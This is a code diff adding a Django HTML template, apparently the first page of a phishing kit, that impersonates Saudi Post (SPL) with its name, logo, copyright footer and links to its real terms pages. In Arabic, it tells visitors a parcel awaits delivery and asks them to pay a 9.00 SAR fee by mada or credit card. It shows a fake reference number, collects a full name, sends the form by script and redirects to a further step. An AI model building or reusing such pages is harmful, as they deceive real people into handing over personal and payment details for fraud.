@@ -1,0 +1,110 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <link rel="stylesheet" href="{% static 'styles.css' %}">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" >
+    <title>Document</title>
+    <link rel="icon" href="{% static 'favicon.ico' %}">
+   
+ 
+</head>
+<body>
+  
+  
+  
+  
+  <div class="container">
+    <div class="header"></div>
+    <div class="line"></div>
+    <button class="top-left-button" >تسجيل</button>
+    <img class="top-right-image" src="{% static 'logo.png' %}" alt="image">
+    
+    <div>
+      <div class="line2"></div>
+      <div class="line3"></div>
+      
+    </div>
+  
+    <div class="text-box">
+      <div class="textbox">
+        <h3>سداد فواتير الخدمات البريدية </h3>
+        <p lang="ar" class="paragraph">لديك طرد في إنتظار التسليم ! نحتاح منك دفع فواتير 
+        الخدمة البريدية </p>
+        <div class="form"> 
+          <input class="refference" type="text" value="SA5182684O33" disabled="disabled">
+          <input type="hidden" name="user_id" value="{{ user.id }}">
+          <form method="post" action=" " id="my-form">
+            {% csrf_token %}
+            
+            {{ form.full_name }}
+            <div class="informations">
+              <b>:حالة الفاتورة</b>
+              <p class="info-text">غير مكتملة</p>
+              <b>:الخدمة</b>
+              <p class="info-text">القيمة المضافة للشحنات</p>
+              <b>:إجمالي المبلغ المستحق</b>
+              <div style="display: flex; justify-content: flex-end;">
+                <p class="info-text">ريال سعودي </p>
+                <p class="info-text"> &nbsp 9.00</p>
+              </div>
+              <b class="lastb">:طريقة الدفع</b>
+              <div style="display: flex; align-items: center; justify-content: flex-end;">
+                <p class="info-text2" >بطاقة مدى البنكية / بطاقة إئتمانية أخرى</p>
+                <img src="{% static 'madacard.png' %}" alt="example image" style="width: 40px; height: auto; margin-left: 5px;">
+                <div style="background-color: #153C3F; width: 15px; height: 15px; border-radius: 25px; margin-left: 5px;"></div>
+                
+                
+              </div>
+             </div>
+            <button type="submit" class="submit-button">متابعة</button>
+        </form>
+        <script>
+          document.getElementById("my-form").addEventListener("submit", function(e){
+              e.preventDefault();
+              var form = document.getElementById("my-form");
+              var formData = new FormData(form);
+              var xhr = new XMLHttpRequest();
+              xhr.open("POST", form.action, true);
+              xhr.onload = function(){
+                  if (xhr.status === 200) {
+                      window.location.href = "/playground/hello/hello2";
+                  }
+              };
+              xhr.send(formData);
+          });
+      </script>
+           
+          
+        </div>
+          
+      </div> 
+      
+    </div>
+    
+  
+  </div>
+  
+  
+ 
+  <div class="container2">
+    <div class="footer">
+      <div style="display: flex;  justify-content: flex-end;">
+        <p class="info-text3" style="font-size: 14px;white-space: normal;" dir="rtl"><img src="{% static 'copyright.png' %}"
+           alt="copyright" style="width: 12px; height: 12px; margin-left: 5px;top: 20px; white-space: nowrap;"><span>2023 &nbsp
+           </span>جميع الحقوق محفوظة لمؤسسة البريد السعودي - سبل </p>
+         
+        <!-- <p class="info-text3" style="font-size: 14px; white-space: nowrap; "> &nbsp 2023</p> -->
+      </div>
+      <div style="display: flex; align-items: center; justify-content: flex-end; font-size: 14px; padding-top: 0px; align-items: flex-start;">
+        <p class="info-text3" style="font-size: 14px;"> عند إستخدامك لهذا الموقع ، فإنك توافق على  <a href='https://splonline.com.sa/ar/terms-of-service/' target="_blank">شروط الخدمة </a> و <a href='https://splonline.com.sa/ar/privacy-policy/' target="_blank">سياسة الخصوصية</a> </p>
+        
+        
+      </div>
+    </div>
+  </div>
+</body>
+</html>
